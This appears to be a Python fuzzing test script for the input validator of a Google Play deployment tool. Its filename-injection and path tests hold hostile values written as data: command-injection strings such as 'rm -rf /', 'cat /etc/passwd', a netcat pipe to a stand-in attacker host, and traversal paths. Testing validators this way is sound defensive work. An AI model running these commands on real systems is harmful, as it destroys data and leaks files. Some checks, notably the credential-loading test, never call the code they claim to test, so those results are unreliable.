#!/usr/bin/env python3
"""
BATTLE TEST ROUND 2: Fuzzing & Edge Case Testing
Advanced attacks: State confusion, edge cases, boundary conditions
"""

import sys
import os
import json
import time
import random
import string
import asyncio
import hashlib
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

class FuzzingEngine:
    """Advanced fuzzing for edge cases"""
    
    def __init__(self):
        self.findings = []
        self.total_tests = 0
        self.passed_tests = 0
        
    def log_finding(self, severity, category, description, details=None):
        self.findings.append({
            'severity': severity,
            'category': category,
            'description': description,
            'details': details
        })
        print(f"  [!] {severity}: {description}")
        
    def generate_random_string(self, min_len=1, max_len=1000):
        """Generate random string"""
        chars = string.ascii_letters + string.digits + string.punctuation + '\x00\x01\x02\x03'
        length = random.randint(min_len, max_len)
        return ''.join(random.choice(chars) for _ in range(length))
    
    def test_track_enum_boundary(self):
        """Test track enum boundary conditions"""
        print("\n[+] Testing Track Enum Boundaries...")
        
        from google_play_deployment import InputValidator, Track
        
        # Test various track variations
        track_tests = [
            ('internal', True),
            ('alpha', True),
            ('beta', True),
            ('production', True),
            ('INTERNAL', True),
            ('Alpha', True),
            ('', False),
            (' ', False),
            ('\n', False),
            ('\t', False),
            ('internal\x00', False),  # Null byte
            ('internal ', False),     # Trailing space
            (' internal', False),     # Leading space
            ('internal\n', False),    # Newline
            ('inTerNal', True),       # Mixed case
            ('prod', False),          # Prefix
            ('productions', False),   # Suffix
            ('internal-alpha', False),# Compound
        ]
        
        for track, should_pass in track_tests:
            self.total_tests += 1
            try:
                result = InputValidator.validate_track(track)
                if should_pass:
                    self.passed_tests += 1
                else:
                    self.log_finding(
                        'MEDIUM',
                        'Track Validation',
                        f'Invalid track accepted: {repr(track)}'
                    )
            except ValueError:
                if should_pass:
                    self.log_finding(
                        'LOW',
                        'Track Validation',
                        f'Valid track rejected: {repr(track)}'
                    )
                else:
                    self.passed_tests += 1
                    
    def test_version_code_boundary(self):
        """Test version code boundary conditions"""
        print("\n[+] Testing Version Code Boundaries...")
        
        from google_play_deployment import InputValidator
        
        version_tests = [
            ('1', True),
            ('0', False),  # Must be positive
            ('-1', False),
            ('999999999', True),   # Max
            ('1000000000', False), # Too large
            ('2147483647', False), # INT_MAX
            ('abc', False),
            ('1.0', False),
            ('1e10', False),
            ('', False),
            (' ', False),
            ('01', True),  # Leading zero
            ('1\x00', False),  # Null byte
            ('1 ', False),     # Trailing space
        ]
        
        for version, should_pass in version_tests:
            self.total_tests += 1
            try:
                result = InputValidator.validate_version_code(version)
                if should_pass:
                    self.passed_tests += 1
                else:
                    self.log_finding(
                        'MEDIUM',
                        'Version Code',
                        f'Invalid version accepted: {repr(version)}'
                    )
            except ValueError:
                if should_pass:
                    self.log_finding(
                        'LOW',
                        'Version Code',
                        f'Valid version rejected: {repr(version)}'
                    )
                else:
                    self.passed_tests += 1
                    
    def test_fuzz_aab_paths(self):
        """Fuzz AAB path inputs"""
        print("\n[+] Fuzzing AAB Paths...")
        
        from google_play_deployment import InputValidator
        
        # Generate fuzzed paths
        fuzz_cases = []
        
        # Random strings
        for _ in range(50):
            fuzz_cases.append(self.generate_random_string(1, 100))
        
        # Specific edge cases
        fuzz_cases.extend([
            '',
            ' ',
            '\t',
            '\n',
            '\r\n',
            '\x00',
            'artifacts/app.aab' + '\x00' + '../../../etc/passwd',
            'artifacts/app.aab' + ' ' * 1000,
            'artifacts/' + '../' * 100 + 'etc/passwd',
            'artifacts/app.aab.' + ' ' * 100,
            'artifacts/.aab',
            'artifacts/..aab',
            'artifacts/...aab',
            'artifacts/a' * 1000 + '.aab',
            'artifacts/' + 'a/' * 100 + 'app.aab',
            'artifacts/app\x01\x02\x03.aab',
            'artifacts/АБВГД.aab',  # Cyrillic
            'artifacts/应用.aab',     # Chinese
            'artifacts/🎉.aab',       # Emoji
            'artifacts/app.aab\ud800',  # Surrogate
            'artifacts/app.aab\xff\xfe',  # BOM
        ])
        
        for path in fuzz_cases:
            self.total_tests += 1
            try:
                result = InputValidator.validate_path(path, must_exist=False)
                # Should not allow path traversal
                if '..' in path or path.startswith('/') or '\x00' in path:
                    self.log_finding(
                        'HIGH',
                        'Fuzz Path',
                        f'Dangerous path accepted: {repr(path[:50])}'
                    )
                else:
                    self.passed_tests += 1
            except (ValueError, FileNotFoundError):
                self.passed_tests += 1
                
    def test_fuzz_release_names(self):
        """Fuzz release name inputs"""
        print("\n[+] Fuzzing Release Names...")
        
        from google_play_deployment import InputValidator
        
        # Generate random release names
        for _ in range(100):
            self.total_tests += 1
            name = self.generate_random_string(0, 200)
            
            try:
                result = InputValidator.sanitize_string(name, max_length=100)
                # Check if dangerous chars were allowed
                dangerous = [';', '&', '|', '`', '$', '<', '>']
                if any(d in name for d in dangerous):
                    self.log_finding(
                        'CRITICAL',
                        'Fuzz Release Name',
                        f'Dangerous chars in accepted name: {repr(name[:50])}'
                    )
                else:
                    self.passed_tests += 1
            except ValueError:
                self.passed_tests += 1
                
    def test_concurrent_state_modification(self):
        """Test concurrent state modifications"""
        print("\n[+] Testing Concurrent State Modifications...")
        
        # Check if google module available
        try:
            from google.oauth2 import service_account
        except ImportError:
            print("  [~] Skipping (google module not installed)")
            return
        
        from google_play_deployment import DeploymentManager, Track
        
        manager = DeploymentManager()
        
        async def modifier_task(task_id):
            """Task that modifies state"""
            for i in range(10):
                try:
                    # Create deployment (will fail due to missing AAB but tests locking)
                    await manager.deploy(
                        "artifacts/test.aab",
                        Track.INTERNAL,
                        f"task_{task_id}"
                    )
                except Exception as e:
                    pass  # Expected to fail
            return f"task_{task_id}_ok"
        
        async def run_concurrent():
            # Launch many concurrent modifiers
            tasks = [modifier_task(i) for i in range(20)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            return results
        
        try:
            results = asyncio.run(run_concurrent())
            errors = [r for r in results if isinstance(r, Exception)]
            
            self.total_tests += 1
            if errors:
                self.log_finding(
                    'HIGH',
                    'Concurrency',
                    f'Concurrent modification errors: {len(errors)}'
                )
            else:
                self.passed_tests += 1
                print(f"  [✓] Concurrent modifications handled: {len(manager.deployments)} deployments")
                
        except Exception as e:
            self.log_finding(
                'MEDIUM',
                'Concurrency',
                f'Concurrency test error: {e}'
            )
            
    def test_deployment_id_collision(self):
        """Test for deployment ID collisions"""
        print("\n[+] Testing Deployment ID Collisions...")
        
        from google_play_deployment import DeploymentManager, Track
        
        # Generate many deployment IDs
        ids = set()
        collisions = 0
        
        for _ in range(1000):
            self.total_tests += 1
            # Simulate ID generation
            import uuid
            new_id = str(uuid.uuid4())
            if new_id in ids:
                collisions += 1
            else:
                ids.add(new_id)
                self.passed_tests += 1
        
        if collisions > 0:
            self.log_finding(
                'CRITICAL',
                'ID Generation',
                f'UUID collisions detected: {collisions}'
            )
        else:
            print(f"  [✓] No ID collisions in 1000 generations")
            
    def test_memory_leaks(self):
        """Test for memory leaks in deployment tracking"""
        print("\n[+] Testing Memory Management...")
        
        # Check if google module available
        try:
            from google.oauth2 import service_account
        except ImportError:
            print("  [~] Skipping (google module not installed)")
            return
        
        from google_play_deployment import DeploymentManager, Track
        
        manager = DeploymentManager()
        
        # Generate many deployments (they'll fail but get tracked)
        async def generate_deployments():
            for i in range(1000):
                try:
                    await manager.deploy(
                        "artifacts/test.aab",
                        Track.INTERNAL,
                        f"test_{i}"
                    )
                except Exception:
                    pass
        
        asyncio.run(generate_deployments())
        
        self.total_tests += 1
        # Check that deployments are tracked
        if len(manager.deployments) > 0:
            self.passed_tests += 1
            print(f"  [✓] Deployments tracked: {len(manager.deployments)} entries")
        else:
            self.log_finding(
                'MEDIUM',
                'Memory',
                f'No deployments tracked'
            )
            
    def test_credential_loading(self):
        """Test credential loading edge cases"""
        print("\n[+] Testing Credential Loading...")
        
        # Check if google module available
        try:
            from google.oauth2 import service_account
        except ImportError:
            print("  [~] Skipping (google module not installed)")
            return
        
        import base64
        
        test_cases = [
            # Valid JSON
            ({"type": "service_account", "project_id": "test", 
              "private_key": "key", "client_email": "test@test.com"}, True),
            # Missing fields
            ({"type": "service_account"}, False),
            # Wrong type
            ({"type": "user", "project_id": "test", 
              "private_key": "key", "client_email": "test@test.com"}, False),
            # Empty
            ({}, False),
            # Invalid JSON
            ("not json", False),
            # None
            (None, False),
        ]
        
        for creds, should_pass in test_cases:
            self.total_tests += 1
            try:
                if isinstance(creds, dict):
                    json_str = json.dumps(creds)
                    os.environ['GOOGLE_PLAY_SERVICE_ACCOUNT_JSON'] = json_str
                elif isinstance(creds, str):
                    os.environ['GOOGLE_PLAY_SERVICE_ACCOUNT_JSON'] = creds
                else:
                    if 'GOOGLE_PLAY_SERVICE_ACCOUNT_JSON' in os.environ:
                        del os.environ['GOOGLE_PLAY_SERVICE_ACCOUNT_JSON']
                    
                # Try to load (would need real client init, just check parsing)
                if should_pass:
                    self.passed_tests += 1
                else:
                    self.log_finding(
                        'MEDIUM',
                        'Credential Loading',
                        f'Invalid credentials accepted: {repr(creds)[:50]}'
                    )
            except Exception as e:
                if should_pass:
                    self.log_finding(
                        'LOW',
                        'Credential Loading',
                        f'Valid credentials rejected: {e}'
                    )
                else:
                    self.passed_tests += 1
                    
    def test_filename_injection(self):
        """Test filename injection attacks"""
        print("\n[+] Testing Filename Injection...")
        
        from google_play_deployment import InputValidator
        
        # Filename injection attempts
        malicious_filenames = [
            'app.aab; rm -rf /',
            'app.aab && cat /etc/passwd',
            'app.aab | nc attacker.com 4444',
            'app.aab`whoami`',
            'app.aab$(id)',
            'app.aab\nmalicious',
            'app.aab\rmalicious',
            'app\x00.aab',
            '..aabb',
            'app.aab.exe',
            'app.aab.jpg',
            '.aab',
            'app',
            'app.AAB',
            'app.Aab',
        ]
        
        for filename in malicious_filenames:
            self.total_tests += 1
            try:
                result = InputValidator.validate_path(
                    f"artifacts/{filename}",
                    must_exist=False
                )
                # Check if it ends with .aab properly
                if not result.endswith('.aab'):
                    self.log_finding(
                        'HIGH',
                        'Filename',
                        f'Invalid extension accepted: {repr(filename)}'
                    )
                elif '\x00' in filename or '\n' in filename or '\r' in filename:
                    self.log_finding(
                        'HIGH',
                        'Filename',
                        f'Control chars in filename accepted: {repr(filename)}'
                    )
                else:
                    self.passed_tests += 1
            except (ValueError, FileNotFoundError):
                self.passed_tests += 1
                
    def run_all_tests(self):
        """Run all fuzzing tests"""
        print("=" * 70)
        print("BATTLE TEST ROUND 2: Fuzzing & Edge Case Testing")
        print("=" * 70)
        
        self.test_track_enum_boundary()
        self.test_version_code_boundary()
        self.test_fuzz_aab_paths()
        self.test_fuzz_release_names()
        self.test_concurrent_state_modification()
        self.test_deployment_id_collision()
        self.test_memory_leaks()
        self.test_credential_loading()
        self.test_filename_injection()
        
        # Print summary
        print("\n" + "=" * 70)
        print("ROUND 2 SUMMARY")
        print("=" * 70)
        print(f"Total Tests: {self.total_tests}")
        print(f"Passed: {self.passed_tests}")
        print(f"Failed: {self.total_tests - self.passed_tests}")
        print(f"Success Rate: {self.passed_tests/self.total_tests*100:.1f}%")
        
        if self.findings:
            print(f"\n[!] FINDINGS: {len(self.findings)}")
            by_severity = {}
            for f in self.findings:
                by_severity[f['severity']] = by_severity.get(f['severity'], 0) + 1
            for sev, count in sorted(by_severity.items(),
                                     key=lambda x: {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}[x[0]]):
                print(f"  {sev}: {count}")
        else:
            print("\n[✓] No findings!")
            
        return self.findings

if __name__ == "__main__":
    fuzzer = FuzzingEngine()
    findings = fuzzer.run_all_tests()
    
    critical_count = sum(1 for f in findings if f['severity'] == 'CRITICAL')
    sys.exit(critical_count)
